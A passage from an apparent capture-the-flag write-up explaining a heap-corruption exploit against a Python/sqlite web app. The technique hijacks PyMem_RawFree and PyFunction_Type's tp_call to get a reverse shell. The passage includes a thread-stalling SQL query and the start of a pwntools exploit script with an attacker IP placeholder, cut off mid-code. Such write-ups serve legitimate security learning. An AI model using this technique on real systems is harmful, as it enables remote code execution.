<p>So I conceded and looked at ryaagard&#x27;s solution, and this is what I understood of it:</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="one-gadgets-in-python">One gadgets in python?<a href="#one-gadgets-in-python" class="hash-link" aria-label="Direct link to One gadgets in python?" title="Direct link to One gadgets in python?">​</a></h3>
<p>The first trick used employed by ryaagard was <code>PyMem_RawFree</code>.</p>
<figure><img src="/assets/image (194).png" alt=""><figcaption><p><a href="https://github.com/python/cpython/blob/3.8/Objects/obmalloc.c#L593">PyMem_RawFree</a></p></figcaption></figure>
<p>The <code>PyMem_Raw</code> set of allocation functions use a <a href="https://github.com/python/cpython/blob/3.8/Include/cpython/pymem.h#L53" target="_blank" rel="noopener noreferrer">context object</a> to store function handlers. It first loads the function into <code>rax</code>, and if it&#x27;s some specific function (which is a no-op function):</p>
<figure><img src="/assets/image (195).png" alt=""><figcaption><p>A no-op free function</p></figcaption></figure>
<p>Then it uses the regular <code>free</code>. Otherwise, it will jump to it, with the first argument being some object from the same context object. This is very appealing, because if we can smash this context object, then any call to it will execute an arbitrary function (like <code>system@plt</code>) with a controlled first argument (like a reverse shell). This effectively turns <code>PyMem_RawFree</code> into a <em>constraintless</em> one_gadget.</p>
<p>So we&#x27;ll need 2 writes:</p>
<ul>
<li>Write a reverse shell command into memory.</li>
<li>Smash the <code>PyMem_Raw</code> context.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="overwriting-a-class-method">Overwriting a class method<a href="#overwriting-a-class-method" class="hash-link" aria-label="Direct link to Overwriting a class method" title="Direct link to Overwriting a class method">​</a></h3>
<p>Now that we have a one_gadget, we can overwrite any class method, and if it&#x27;s ever called, we&#x27;ll get a reverse shell. ryaagard opted to overwrite <code>PyFunction_Type</code>, which is the object representing the python function type. It stores fields, like function pointers, which handle different functionalities of <code>function</code> objects. One of these is <code>tp_call</code>, which handles calling functions . This is an ideal target, because there will be many instances where a python function would be called, and all it takes is one of these calls to happen to give us a reverse shell. However, by default <code>tp_call</code> isn&#x27;t actually used, so we can&#x27;t just overwrite it and call it a day. Let&#x27;s have a closer look:</p>
<p>Searching for references of <code>tp_call</code> yields <code>_PyObject_MakeTpCall</code>:</p>
<figure><img src="/assets/image (196).png" alt=""><figcaption><p><a href="https://github.com/python/cpython/blob/3.8/Objects/call.c#L119">_PyObject_MakeTpCall</a></p></figcaption></figure>
<p>Which, as you might expect, goes on to call the function:</p>
<figure><img src="/assets/image (197).png" alt=""><figcaption><p><a href="https://github.com/python/cpython/blob/3.8/Objects/call.c#L156">_PyObject_MakeTpCall</a></p></figcaption></figure>
<p>All seems good, so where is this (and <code>tp_call</code> in general) used? The 2 main instances I found were:</p>
<div><figure><img src="/assets/image (198).png" alt=""><figcaption><p><a href="https://github.com/python/cpython/blob/3.8/Objects/call.c#L74">_PyObject_FastCallDict</a></p></figcaption></figure> <figure><img src="/assets/image (199).png" alt=""><figcaption><p><a href="https://github.com/python/cpython/blob/3.8/Objects/call.c#L215">PyObject_Call</a></p></figcaption></figure></div>
<p>Both of which are used by <code>PyEval_CallObjectWithKeywords</code>:</p>
<figure><img src="/assets/image (200).png" alt=""><figcaption><p><a href="https://github.com/python/cpython/blob/3.8/Objects/call.c#L806">PyEval_CallObjectWithKeywords</a></p></figcaption></figure>
<p>In both of these cases, we can see a common thread: <code>_PyVectorcall_Function</code> is used to determine whether or not to use <code>tp_call</code>. It seems like this has to return <code>NULL</code> for python to decide to use <code>tp_call</code>, so how do we do that?</p>
<figure><img src="/assets/image (202).png" alt=""><figcaption><p><a href="https://github.com/python/cpython/blob/3.8/Include/cpython/abstract.h#L81">_PyVectorcall_Function</a></p></figcaption></figure>
<p>It turns out that it checks for feature <code>VECTORCALL</code>, by checking the <code>tp_flags</code> field of the class, and seeing whether the <a href="https://github.com/python/cpython/blob/3.8/Include/object.h#L293" target="_blank" rel="noopener noreferrer">_Py_TPFLAGS_HAVE_VECTORCALL</a> (<code>1&lt;&lt;11</code>) flag is set. If it&#x27;s disabled (i.e. flag isn&#x27;t set), then it resorts to <code>tp_call</code>.</p>
<p>We can determine, by looking at the <a href="https://github.com/python/cpython/blob/3.8/Include/cpython/object.h#L177" target="_blank" rel="noopener noreferrer">_typeobject</a> struct definition, that the offsets we need are:</p>
<ul>
<li><code>0x80</code>: <code>tp_call</code> (= <code>PyMem_RawFree</code>)</li>
<li><code>0xa8</code>: <code>tp_flags</code> (= <code>0</code>)</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="more-crashes">More crashes<a href="#more-crashes" class="hash-link" aria-label="Direct link to More crashes" title="Direct link to More crashes">​</a></h3>
<p>We also have another problem of triggering <code>tp_call</code>. This because another snag which is the fact that at the end of executing the SQL statement, like a reasonable application which wants to avoid memory leaks (lame), it frees all the memory it allocated previously, including our arbitrary allocations. When freeing these, the process will abort because they&#x27;re obviously malformed &quot;chunks&quot;, so we never actually reach the python part of the thread we corrupt, meaning our corrupted data isn&#x27;t used by this thread.</p>
<p>Fortunately, the web application is multithreaded, and share all the same memory, so while the current thread may abort, another thread may want to call a python function, and will use our corrupted <code>tp_call</code>, before the application can abort. So ideally we&#x27;d need to stall our thread from aborting, to give us time for the application to trigger our reverse shell.</p>
<p>While sqlite doesn&#x27;t have any kind of <code>SLEEP</code> statement, we can use an SQL statement that would take a while to evaluate, which are also commonplace in SQL time-based injections. So we can use something like the following:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">SELECT</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token operator" style="color:hsl(221, 87%, 60%)">LIKE</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;ABCDEFG&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain">UPPER</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">HEX</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">RANDOMBLOB</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">200000000</span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="solution">Solution<a href="#solution" class="hash-link" aria-label="Direct link to Solution" title="Direct link to Solution">​</a></h2>
<p>So finally, putting <em><strong>all</strong></em> of this together, we can finally produce the following exploit:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> string</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">python </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> context</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">binary </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;python3.8&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">IP</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> PORT </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;[insert ip here]&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token number" style="color:hsl(35, 99%, 36%)">9999</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">request2size </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">lambda</span><span class="token plain"> req</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">req</span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token number" style="color:hsl(35, 99%, 36%)">0x17</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token operator" style="color:hsl(221, 87%, 60%)">~</span><span class="token number" style="color:hsl(35, 99%, 36%)">0xf</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> req</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;=</span><span class="token number" style="color:hsl(35, 99%, 36%)">9</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0x20</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">size2usable </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">lambda</span><span class="token plain"> sz</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> sz</span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">escape_byte</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">c</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> force</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">False</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	charset </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">set</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">string</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">printable</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	charset </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-=</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">set</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">string</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">whitespace</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">b&quot;&#x27;\&quot;&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> force</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> c </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">			</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;\\0&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">elif</span><span class="token plain"> c </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> charset</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">			</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">chr</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">c</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;\\x&quot;</span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">format</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">c</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;02x&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">escape</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">x</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">join</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">map</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">escape_byte</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> x</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">malloc_escaped</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">escaped</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token comment" style="color:hsl(230, 4%, 64%)"># at least one character should be escaped to trigger the malloc</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;\\&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> escaped</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;SELECT json_extract(&#x27;{a:\&quot;%s\&quot;}&#x27;, &#x27;$.a&#x27;)&quot;</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">%</span><span class="token plain"> escaped</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">spray</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> char</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;A&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> size </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0xf</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	x </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> escape_byte</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">ord</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">char</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> force</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">True</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	x </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> x</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">size2usable</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> char</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> malloc_escaped</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">x</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># use json_extract with escaped strings to spray</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">to_spray </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">0x60</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">7</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">0x290</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">7</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sprays </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">char </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0x41</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> count </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> to_spray</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> _ </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">range</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">count</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		sprays</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">spray</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> char</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">chr</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">char</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		char </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">pad_to_size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">escaped</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> sz</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> escaped </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;\\x00&quot;</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sz</span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token number" style="color:hsl(35, 99%, 36%)">0x10</span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">len</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">escaped</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token operator" style="color:hsl(221, 87%, 60%)">//</span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">malloc</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> sz</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	data </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> escape</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 